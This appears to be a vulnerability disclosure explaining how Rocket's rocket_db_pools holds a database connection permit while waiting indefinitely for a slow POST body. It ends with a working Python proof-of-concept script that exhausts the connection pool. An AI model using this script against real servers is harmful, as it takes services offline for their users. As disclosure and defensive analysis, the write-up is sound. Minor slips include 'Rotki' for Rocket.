# DB Connection Pool DoS in rocket.rs

Web applications written in [Rocket](https://rocket.rs) are susceptible to a
slow-POST DoS when using the
[`rocket_db_pools`](https://api.rocket.rs/v0.5/rocket_db_pools/) feature to
manage database connections. Under Rocket's 'sane default' configuration for
release builds, resource exhaustion occurs once `num_cpus * 4` simultaneous
connections are made. In particular, this limit is much lower than the HTTP
thread pool size of most modern servers.

The `rocket_db_pools` feature is Rocket's builtin, ORM-agnostic support for
database connections. This feature simplifies accessing one or more databases
via connection pools: data structures that maintain active database connections
for use in each request. These connection pools are the
[idiomatic](https://rocket.rs/guide/v0.5/state/#databases) method for database
interaction within Rocket, and are widely used by Rocket applications.

#### Background on Rocket's codegen
A route in Rocket typically looks like this:
```rust
#[post("/", data = "<post>")]
async fn create(mut db: Connection<Db>, mut post: Json<Post>) -> Result<Created<Json<Post>>> {
    let results = sqlx::query!(
            "INSERT INTO posts (title, text) VALUES (?, ?) RETURNING id",
            post.title, post.text
        )
        .fetch(&mut **db)
        .try_collect::<Vec<_>>()
        .await?;

    post.id = Some(results.first().expect("returning results").id);
    Ok(Created::new("/").body(post))
}
```

The `#post` annotation expands into the `route_attribute!` macro, which parses
the function definition into a generic handler for HTTP requests.
```rust
pub fn route_attribute<M: Into<Option<crate::http::Method>>>(
    method: M,
    args: proc_macro::TokenStream,
    input: proc_macro::TokenStream
) -> TokenStream {
    let result = match method.into() {
        Some(method) => incomplete_route(method, args.into(), input.into()),
        None => complete_route(args.into(), input.into())
    };

    result.unwrap_or_else(|diag| diag.emit_as_item_tokens())
}
```

Both `incomplete_route` and `complete_route` then call into `codegen_route`,
which constructs the handler function from the supplied parameters.

```rust
fn codegen_route(route: Route) -> Result<TokenStream> {
    use crate::exports::*;

    // Generate the declarations for all of the guards.
    let request_guards = route.request_guards.iter().map(request_guard_decl);
    let param_guards = route.param_guards().map(param_guard_decl);
    let query_guards = query_decls(&route);
    let data_guard = route.data_guard.as_ref().map(data_guard_decl);

    // Extract the sentinels from the route.
    let sentinels = sentinels_expr(&route);

    // Gather info about the function.
    let (vis, handler_fn) = (&route.handler.vis, &route.handler);
    let deprecated = handler_fn.attrs.iter().find(|a| a.path().is_ident("deprecated"));
    let handler_fn_name = &handler_fn.sig.ident;
    let internal_uri_macro = internal_uri_macro_decl(&route);
    let responder_outcome = responder_outcome_expr(&route);

    let method = route.attr.method;
    let uri = route.attr.uri.to_string();
    let rank = Optional(route.attr.rank);
    let format = Optional(route.attr.format.as_ref());

    Ok(quote! {
        #handler_fn

        #[doc(hidden)]
        #[allow(nonstandard_style)]
        /// Rocket code generated proxy structure.
        #deprecated #vis struct #handler_fn_name {  }

        /// Rocket code generated proxy static conversion implementations.
        #[allow(nonstandard_style, deprecated, clippy::style)]
        impl #handler_fn_name {
            fn into_info(self) -> #_route::StaticInfo {
                fn monomorphized_function<'__r>(
                    #__req: &'__r #Request<'_>,
                    #__data: #Data<'__r>
                ) -> #_route::BoxFuture<'__r> {
                    #_Box::pin(async move {
                        #(#request_guards)*
                        #(#param_guards)*
                        #query_guards
                        #data_guard

                        #responder_outcome
                    })
                }

                #_route::StaticInfo {
                    name: stringify!(#handler_fn_name),
                    method: #method,
                    uri: #uri,
                    handler: monomorphized_function,
                    format: #format,
                    rank: #rank,
                    sentinels: #sentinels,
                }
            }

            #[doc(hidden)]
            pub fn into_route(self) -> #Route {
                self.into_info().into()
            }
        }

        /// Rocket code generated wrapping URI macro.
        #internal_uri_macro
    })
}
```

The block we're particularly interested in is the instantiation of request guards:
```rust
    // Generate the declarations for all of the guards.
    let request_guards = route.request_guards.iter().map(request_guard_decl);
    let param_guards = route.param_guards().map(param_guard_decl);
    let query_guards = query_decls(&route);
    let data_guard = route.data_guard.as_ref().map(data_guard_decl);
```

Within Rocket, [request guards](https://rocket.rs/guide/v0.5/requests/#requests)
is a dependency injection-esque middlware/auth feature, which protects a handler
from being called erroneously based on information in an incoming request. Each
request guard represents an arbitrary validation policy which is implemented
through the `FromRequest` trait. This trait has one method
`from_request(request: &'r Request') -> Outcome<Self, Self::Error>`, which
receives an object containing the request's header block, and returns either an
object representing the validated data, or raises an error to deny this the
request.

In addition to performing data validatin, request guards are also overloaded to
service the `rocket_db_pools` feature. Going back to our route, we see that it
receives in its arguments a value of type `Connection`:
```rust
#[post("/", data = "<post>")]
async fn create(mut db: Connection<Db>, mut post: Json<Post>) -> Result<Created<Json<Post>>> {
    let results = sqlx::query!(
            "INSERT INTO posts (title, text) VALUES (?, ?) RETURNING id",
            post.title, post.text
        )
        .fetch(&mut **db)
        .try_collect::<Vec<_>>()
        .await?;

    post.id = Some(results.first().expect("returning results").id);
    Ok(Created::new("/").body(post))
}
```

`Connection<Db>` is a request guard, and its implementation of `FromRequest` looks like this:
```rust
async fn from_request(req: &'r Request<'_>) -> Outcome<Self, Self::Error> {
    match D::fetch(req.rocket()) {
        Some(db) => match db.get().await {
            Ok(conn) => Outcome::Success(Connection(conn)),
            Err(e) => Outcome::Error((Status::ServiceUnavailable, Some(e))),
    },
        None => Outcome::Error((Status::InternalServerError, None)),
    }
}
```

The implementation fetches the application's connection manager using
`D::fetch`, and then calls the `get()` method on the connection manager. The
`get()` method then forwards to `timeout_get()`:
```rust
pub async fn timeout_get(&self, timeouts: &Timeouts) -> Result<W, PoolError<M::Error>> {
    let _ = self.inner.users.fetch_add(1, Ordering::Relaxed);
    let users_guard = DropGuard(|| {
        let _ = self.inner.users.fetch_sub(1, Ordering::Relaxed);
    });

    let non_blocking = match timeouts.wait {
        Some(t) => t.as_nanos() == 0,
        None => false,
    };

    let permit = if non_blocking {
        self.inner.semaphore.try_acquire().map_err(|e| match e {
            TryAcquireError::Closed => PoolError::Closed,
            TryAcquireError::NoPermits => PoolError::Timeout(TimeoutType::Wait),
        })?
    } else {
        apply_timeout(
            self.inner.runtime,
            TimeoutType::Wait,
            timeouts.wait,
            async {
                self.inner
                    .semaphore
                    .acquire()
                    .await
                    .map_err(|_| PoolError::Closed)
            },
        )
        .await?
    };

    let inner_obj = loop {
        let inner_obj = match self.inner.config.queue_mode {
            QueueMode::Fifo => self.inner.slots.lock().unwrap().vec.pop_front(),
            QueueMode::Lifo => self.inner.slots.lock().unwrap().vec.pop_back(),
        };
        let inner_obj = if let Some(inner_obj) = inner_obj {
            self.try_recycle(timeouts, inner_obj).await?
        } else {
            self.try_create(timeouts).await?
        };
        if let Some(inner_obj) = inner_obj {
            break inner_obj;
        }
    };

    users_guard.disarm();
    permit.forget();

    Ok(Object {
        inner: Some(inner_obj),
        pool: self.weak(),
    }
    .into())
}
```

The main action of interest within `timeout_get` is the section where a database connection is reserved by decrementing a semaphore:
```rust
let permit = if non_blocking {
        self.inner.semaphore.try_acquire().map_err(|e| match e {
            TryAcquireError::Closed => PoolError::Closed,
            TryAcquireError::NoPermits => PoolError::Timeout(TimeoutType::Wait),
        })?
    } else {
        apply_timeout(
            self.inner.runtime,
            TimeoutType::Wait,
            timeouts.wait,
            async {
                self.inner
                    .semaphore
                    .acquire()
                    .await
                    .map_err(|_| PoolError::Closed)
            },
        )
        .await?
    };
```

This semaphore represents the number of connections available in the pool, and
by default for release builds it is set to `num_cpus() * 4`. Once decremented, the
semaphore is not incremented again until the underlying database connection is
dropped. This occurs only if the connection closes, or if the route handler
finishes executing:
```rust
impl<T> Drop for Object<T> {
    fn drop(&mut self) {
        if let Some(obj) = self.obj.take() {
            if let Some(pool) = self.pool.upgrade() {
                {
                    let mut queue = pool.queue.lock().unwrap();
                    queue.push(obj);
                }
                let _ = pool.available.fetch_add(1, Ordering::Relaxed);
                pool.semaphore.add_permits(1);
                pool.clean_up();
            }
        }
    }
}
```

So now, going back to our macro expansion block we see that the first line which
instantiates the request guards will acquire a permit for a database connection
and hold on to it for the duration of the request:

```rust
let request_guards = route.request_guards.iter().map(request_guard_decl);
let param_guards = route.param_guards().map(param_guard_decl);
let query_guards = query_decls(&route);
let data_guard = route.data_guard.as_ref().map(data_guard_decl);
```

The last line instantiates the data guard, which is responsible for
deserializing the request body and passing it to the handler. This is done for
each type via the `FromData` trait. A prototypical implementation is the  for arbitrary JSON deserialization:
```rust
impl<'r, T: Deserialize<'r>> Json<T> {
    fn from_str(s: &'r str) -> Result<Self, Error<'r>> {
        serde_json::from_str(s).map(Json).map_err(|e| Error::Parse(s, e))
    }

    async fn from_data(req: &'r Request<'_>, data: Data<'r>) -> Result<Self, Error<'r>> {
        let limit = req.limits().get("json").unwrap_or(Limits::JSON);
        let string = match data.open(limit).into_string().await {
            Ok(s) if s.is_complete() => s.into_inner(),
            Ok(_) => {
                let eof = io::ErrorKind::UnexpectedEof;
                return Err(Error::Io(io::Error::new(eof, "data limit exceeded")));
            },
            Err(e) => return Err(Error::Io(e)),
        };

        Self::from_str(local_cache!(req, string))
    }
}
```

This implementation calls `data.open`, which calls into `DataStream::new`, then
`DataStream::Base::take`, which reads from an input stream asynchronously. Since
no timeout is specified on this operation, if the HTTP body is incomplete, the
runtime will wait indefinitely for data while yielding execution for other
requests.

To summarise then, in each request we have:
```rust
// instantiate request guards. this decrements the connection pool semaphore.
let request_guards = route.request_guards.iter().map(request_guard_decl);
let param_guards = route.param_guards().map(param_guard_decl);
let query_guards = query_decls(&route);
// deserialize the request body. this will wait forever if the body is incomplete
// all this time, we're still holding a permit from the connection pool semaphore
let data_guard = route.data_guard.as_ref().map(data_guard_decl);
```

So once the initial pool of connections gets exhausted (e.g 12 cores = 48
simultaneous connections by default), then no other requests requiring a database
connection will succeed.

#### Proof of Concept
This script executes a DoS attack on Rotki's reference implementation of [database
connections](https://github.com/rwf2/Rocket/tree/master/examples/databases.).


```py
#!/usr/bin/env python3
import ssl
import time
from tqdm import tqdm
from pwn import *
context.log_level = "debug"

def main():
    # Default DB connection pool is equal to number of CPUs * 4
    # So resource exhaustion occurs at 48 simultaneous connections
    for conn_num in tqdm(range(48)):
        conn = connect("rocket.local", 8000)
        conn.send(
            (
                "POST /sqlx HTTP/1.1\r\n"
                + "Host: rocket.local\r\n"
                + "Content-Type: application/json\r\n"
                + "Content-Length: 20\r\n"
                + "\r\n\r\n"
                + '{"title":"asdf"'
            ).encode()
        )
    while True:
        pass


if __name__ == "__main__":
    main()
```

